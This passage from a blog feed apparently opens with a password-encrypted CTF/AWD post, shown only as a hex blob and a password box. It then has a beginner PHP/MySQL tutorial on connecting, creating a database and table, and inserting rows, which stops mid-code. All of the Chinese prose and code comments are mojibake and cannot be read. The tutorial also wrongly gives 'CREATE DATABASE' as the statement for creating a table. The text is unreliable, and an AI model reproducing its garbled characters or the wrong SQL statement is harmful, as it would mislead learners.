1753cf3c0d94b389f8895711f4b843e7c71aa393296b10c2466629742c1524a4d100b3b846bd1be64bed825ade8c9bc5224ca1c0a8fa3db77c00ec47b9d19dab23554051224e5653279677975e4fb9d9842374fbb46074fb3c2d2813a67939c7a6e0c4b9f4e45c05a41ea13d9a22ef26b8afcdc8b6e0402f120d3a436044b2fcd798a60a9af89a70ce81b54c6f3492c085ca2ba6f4633970ed72398d1a54523e6e8f0060d80fcdfc4a191a79cec5ebf165a9b298000620db84bee682751228cb352e0f0114e0d4d6be07f2fbca53ab8c981ab261887cbe3bb9546222f0e6a141ef895a13aed51744506ca12ad7dbe8751a53b2cb3a9d5208eaffdc98e5d7fd9dd6869c4edfc9917fafaafd2ab4f9fa5092428c746b7f3372847edffe5fa38cbfcce990ef90215d03e59a3032c568868f006ce00b780d0295ddba6a3a5ed2d8df3718a1013062b8ede5e0e4fcb158491cacb745ce0f26e076c92d2a37d869227ba8f30de6ef39cd0546bd250b12e44f691d5a8be820e26598a2182f64ed631b389d89d8398284c868d52ad0e0fbcb5e446009ff81439f2ae57eed028e0bd2eb87964ccfb5d4c1dc6067033ef2bf2472b5d494b613f53e9eb130f486dc1649b5c6b24530ec23eb00044445eaed2c0045918f7e29e7a7c1a874263ef67375595d5bc1dc35fb83ef3a08d188eec9eaa98147a17cbe5bd572c6890c3783f53c6e43c6decfae0c597131f8b4a0c4b467a5c5532d269f72aca091380c172de44c0349e2ea4e2535f2fc2336325fc8dd6d00bc171da394847a63cf68f83decb828536d44e89d899f000974e5663c3f39c8b7dc6bd5751606e899d4637bdd919a1f4707a6f75caa989e4d25f0e0442d5b0fa56da46fd59f6df99e072e84a61fb2a2cf80b721d068301a22e182805fa4a854cbda1860fe8b85554eb3b61fc64b7ceb22b00833d27ab8298d52383af063409bda44ac8dd5fb66b1ae56bd8651720b4ad4b047e2be60a17c9356da1bbb7c39afd5a92853426cd8db9c46d956ce02b05cfb644644dd282af80080f850a47c31d72d936b3f62937d8083deafc218450ca2962d108736033376edf1027bb211e92216ed12067b9d3d4844bfd0469f0ce06f493a77514ff3570d5314d5bb90cec9afcfe288cfc46b2c99e040166b4a42118e447c74519d8531fc8cb4f8354e05b92bd48f69c3be2cc1947bc684a6da627d408babef061dc81c02deaa8163731ba5104bf00e0541247fec02158077ca588c73ca0282eaa7d24aab852e36ffd1de052908b6eb034d023971a1fbb759a54484b5fe64ca2270e674ada77bce9d2ba240a57eb83574baec7785e73d0272b17e7524028a65811b103ddcd3167261f1514043bacaa5d04a4fb7a76db85bc96089e95ace5f48b2b8095dc524725b89ca01ed2349eaf1fea4eab9409222fa84a66541029ba578d63ec660ce50cfa29f3bb4fb19886d0647621763b01b44cef675d82538802899744e23e0fb7f5cac74ef151746449cf910162f9424a566172b3de9ca6c5682bf888dc9f72bd3ba442275df106529481fc2a537ae0830e61cc856ee3c14fe9d2cfb4ced20249abff999235e1cfe3a872809977d4665a254e14ba0bfba8a20ad0b9b45d816b033f7edfa19229dfa9d254f1ff9900b130cf7f61267a26baad5a2e0c4c42eb4d3a3972c1d706aaf72a9a3c7dbde860b46b24b1374b917de537b154574fd22ae096b61b750e7d6e238bf4fa194a9834279a515f963d5ded4ec2f427fbac299f2977e8a5c7d6b1ae915cffc922c6a2214adb795a9bc085c4b5d0a5f05d3aab81b175ac8b430ff49acc4c3bff842f86d81d5d2953dfeb7006547f80123d62ef7c659ac68de709c41c6b79ca334fbc9932622ad6d0dae9c83a7e59ed1836d0ea348db9f317de42a66ca07cd7c54e5c8b819c43a917cc189053d7203eb804f979dca1ece3f3a481e77f7d54c9e4ca1e9ebcdb0fc39c3bb57dc0ba2ce8092f02f83bb4211cedb4f501bd99b7f6d67da808d2bfcdda4f8dba17c5f08bb67861bcf1b935129b3f47f5abfd73ea96970367c0d1fe1a2e24be9532b94508fcd155431bb28f5f8abfdfeb7c303fa5f973724ba09295a2ff6225822124b746b2072f411c30be785a3728f82c82369efb40b1a1d1f15e04af1e9a44108ce67d4477d787215a536ae03b5206224b86f38ce2b06bf9b5c9dc0e4ccab498683f94121e5922887788b730c2c4fdf48fe9a4d72645dafc01f0180cf7f468aac37a39190bcff5ef7b7954bbbbda3aa40c04d21a81db7622b71f6f715074206dfbcb7a41ee064be6dae14b3cc2eae8e0ae02b29ddacb4f24242073e69355f36d8634a8e0dc6e89cf2b8bf8bd59c99f70637f5c7ca4fd214ca246fb80408137e5e067680e0adec296af1d9fd3c967186371fa1d7879f5cd09c813af962a74de06706e8b9bc775d219bb871d04327ecdae6f6add9dfde5222a6affe2c408f69694158e73e23a9e91f086570c9b2968e9089d2aa27acf46e00ecb8c9ecfc6ee108728c741af779443481779aea4c0afce7bd57ca7a965fc427ab7f1e5a255754c7e920a962e8da5f438cb31eda690b5700e63052fc525eb6090da6f1304345dd4d78f34a4dcafae301263e7e805fd473e868bfad6719d016584b50c8fc44b912f006243d80d48e816b921484435fe43333708d9a2f0eee3b4e1b9949d53cc10c2f6031b80c4f851c6d0ca723e93f15cf54af10e2b438f6a0787f641573eb22b1da54707d087b44709eb47765dde9fddcba366e10a5537e93bc51ccc92af8afcbd671d3c81696d5254f9fb5e3e0aecf3fcb2d61c2b87273076b38a131bd8347b9f2aee74b2becf3a6d788370fa4a5f400d1ebaf5873733d4ca6f6021a0651815c8b8c1a7605bf7a9a74fd8b6aac526954ad61b2ff3e1a2ab0797c1390a8030bbc940ddae7cccc569383022e8f9511f6d4631706f40a73764d008c9953bc29af4db05acc5b0e0eeef24b12cb1bc2a2856d49f9150a4ef9bff9cefc9c3de9578a1e00734d0abf0e61b5bb3e3d7bd7d84e126e484fac2ce83ea4052770e82271bc52f237724e26c832f03d924f9ccf932a45a4b7299ad3c2f7a536aed20f6b3b60243b8ee42d5193973b25dbfbddb30cf9832ca3c56701a195c26842843cdcd4ab501ef3135704cbbaa8bdb898ba4f298b0cc6d4a48045ea169e8ab88d34f89448beece67de69d5a8078a7e492b34145e668e48337e43ab6ae4a747acf999c6328953d8c5aacf561dfc0a1bd912102638d60e496b40f0fe8d423edbfefb7b22e8b3db6bef2f9d4405e7dc80172684b891d47b7dc53815677c2b65fdad8208d631cb74c8f18019eedcdb0978bae24bd9592a82a575d3d275d7ca771eebf3ae69ba4566dbd3a9223cef2383f277c843b05b4fb8c2d85909b08e21db0d9afb6c3b8a899eff9cdd2bb8c6b78f3087c13d35bbbaf11a39c77f7181e4c01b1204824bb2ca76cc3b8dc225d6f6263f2757c7c7c769ed0a5ab51f5cc56d6f5332884db4e307a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP æ•°æ®åº“æ“ä½œ</title>
    <link href="/2020/12/15/PHP%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
    <url>/2020/12/15/PHP%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>èœé¸Ÿé©¿ç«™PHPå­¦ä¹ ç¬”è®°</p></blockquote><h2 id="PHPè¿æ¥MySQL"><a href="#PHPè¿æ¥MySQL" class="headerlink" title="PHPè¿æ¥MySQL"></a>PHPè¿æ¥MySQL</h2><p>PHPè¿æ¥æ•°æ®åº“ä¸»è¦ç”¨åˆ°mysqli_connect()å‡½æ•°</p><p>å‡½æ•°è¯­æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_connect(host,username,password,dbname,port,socket);<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š<br>| å‚æ•°     | æè¿°                                        |<br>| â€”â€”â€“ | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- |<br>| host     | å¯é€‰ã€‚è§„å®šä¸»æœºåæˆ– IP åœ°å€ã€‚                |<br>| username | å¯é€‰ã€‚è§„å®š MySQL ç”¨æˆ·åã€‚                   |<br>| password | å¯é€‰ã€‚è§„å®š MySQL å¯†ç ã€‚                     |<br>| dbname   | å¯é€‰ã€‚è§„å®šé»˜è®¤ä½¿ç”¨çš„æ•°æ®åº“ã€‚                |<br>| port     | å¯é€‰ã€‚è§„å®šå°è¯•è¿æ¥åˆ° MySQL æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ |<br>| socket   | å¯é€‰ã€‚è§„å®š socket æˆ–è¦ä½¿ç”¨çš„å·²å‘½å pipeã€‚   |</p><p>é¦–å…ˆé€šè¿‡ phpinfo() æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210414170628923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹é¢MySQLié¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹çš„æ€æƒ³è¿æ¥æ•°æ®åº“</p><h3 id="åˆ›å»ºè¿æ¥"><a href="#åˆ›å»ºè¿æ¥" class="headerlink" title="åˆ›å»ºè¿æ¥"></a>åˆ›å»ºè¿æ¥</h3><p>å®ä¾‹1ï¼š<strong>MySQLi - é¢å‘å¯¹è±¡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;password&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br> <br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error);<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šåœ¨ä»¥ä¸Šé¢å‘å¯¹è±¡çš„å®ä¾‹ä¸­ <code>$connect_erro</code>r æ˜¯åœ¨ PHP 5.2.9 å’Œ 5.3.0 ä¸­æ·»åŠ çš„ã€‚å¦‚æœä½ éœ€è¦å…¼å®¹æ›´æ—©ç‰ˆæœ¬ è¯·ä½¿ç”¨ä»¥ä¸‹ä»£ç æ›¿æ¢:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (mysqli_connect_error()) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ•°æ®åº“è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error());<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ä¾‹2ï¼š<strong>MySQLi - é¢å‘è¿‡ç¨‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;password&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br> <br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šé»˜è®¤ç«¯å£å·ä¸º3306ï¼Œå¦‚æœç«¯å£å·ä¿®æ”¹ï¼Œå¯ä»¥ä¸ºæ•°æ®åº“å‚æ•°æ·»åŠ ç©ºå­—ç¬¦ä¸²ï¼Œå¦‚: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>,<span class="hljs-string">&quot;&quot;</span>,port);<br></code></pre></td></tr></table></figure><h3 id="å…³é—­è¿æ¥"><a href="#å…³é—­è¿æ¥" class="headerlink" title="å…³é—­è¿æ¥"></a>å…³é—­è¿æ¥</h3><p>è¿æ¥åœ¨è„šæœ¬æ‰§è¡Œå®Œåä¼šè‡ªåŠ¨å…³é—­ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥å…³é—­è¿æ¥ï¼š</p><p>å®ä¾‹ (MySQLi - é¢å‘å¯¹è±¡)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>-&gt;close();<br></code></pre></td></tr></table></figure><p>å®ä¾‹ (MySQLi - é¢å‘è¿‡ç¨‹)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_close(<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åº“è¿æ¥ç¼–ç é—®é¢˜</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//php5</span><br>mysql_query(<span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//è¯»åº“ </span><br>mysql_query(<span class="hljs-string">&quot;set names &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//å†™åº“</span><br><br><span class="hljs-comment">//php7</span><br>mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//è¯»åº“ </span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//å†™åº“</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h2><p>åˆ›å»º MySQLæ•°æ®åº“è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE DATABASE database_name;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ•°æ®åº“demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL åˆ›å»ºæ•°æ®åº“</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error());<br>&#125;<br> <br><span class="hljs-comment">// åˆ›å»ºæ•°æ®åº“</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;CREATE DATABASE demo&quot;</span>;<br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ•°æ®åº“åˆ›å»ºæˆåŠŸ&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error creating database: &quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“åˆ›å»ºæˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210414182704415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="åˆ›å»ºæ•°æ®è¡¨"><a href="#åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="åˆ›å»ºæ•°æ®è¡¨"></a>åˆ›å»ºæ•°æ®è¡¨</h2><p>åˆ›å»º MySQL æ•°æ®è¡¨è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE DATABASE table_name;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®è¡¨MyDemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL åˆ›å»ºæ•°æ®è¡¨MyDemo</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error());<br>&#125;<br> <br><span class="hljs-comment">// ä½¿ç”¨ sql åˆ›å»ºæ•°æ®è¡¨</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;CREATE TABLE MyDemo (</span><br><span class="hljs-string">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="hljs-string">name VARCHAR(30) NOT NULL,</span><br><span class="hljs-string">sex VARCHAR(30) NOT NULL,</span><br><span class="hljs-string">age INT(3)</span><br><span class="hljs-string">)&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ•°æ®è¡¨MyDemoåˆ›å»ºæˆåŠŸ&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åˆ›å»ºæ•°æ®è¡¨é”™è¯¯: &quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºæˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210414184817372.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ’å…¥æ•°æ®"><a href="#æ’å…¥æ•°æ®" class="headerlink" title="æ’å…¥æ•°æ®"></a>æ’å…¥æ•°æ®</h2><p>INSERT INTO è¯­å¥é€šå¸¸ç”¨äºå‘ MySQL è¡¨æ·»åŠ æ–°çš„è®°å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">INSERT INTO table_name (column1, column2, column3,...)<br>VALUES (value1, value2, value3,...)<br></code></pre></td></tr></table></figure><p>å¾€è¡¨é‡Œæ’å…¥ä¸€æ¡æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">INSERT INTO mydemo (id, name, sex ,age)<br>VALUES (<span class="hljs-number">1001</span>, <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>, <span class="hljs-string">&#x27;ç”·&#x27;</span>,<span class="hljs-number">18</span>)<br></code></pre></td></tr></table></figure><p>ä»£ç å®ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL æ’å…¥æ•°æ®</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1001, &#x27;å¼ ä¸‰&#x27;, &#x27;ç”·&#x27;,18)&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ’å…¥æ•°æ®æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210415125056358.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ’å…¥å¤šæ¡æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1002, &#x27;æå››&#x27;, &#x27;å¥³&#x27;,19);&quot;</span>;<br><span class="hljs-variable">$sql</span> .= <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1003, &#x27;ç‹äº”&#x27;, &#x27;ç”·&#x27;,20);&quot;</span>;<br><span class="hljs-variable">$sql</span> .= <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1004, &#x27;åˆ˜å…­&#x27;, &#x27;ç”·&#x27;,21);&quot;</span>;<br><br><span class="hljs-comment">#æ³¨æ„æ­¤å¤„æ”¹ä¸ºmysqli_multi_queryå‡½æ•°ï¼Œæ‰§è¡Œå¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ </span><br><span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$sql</span> . <span 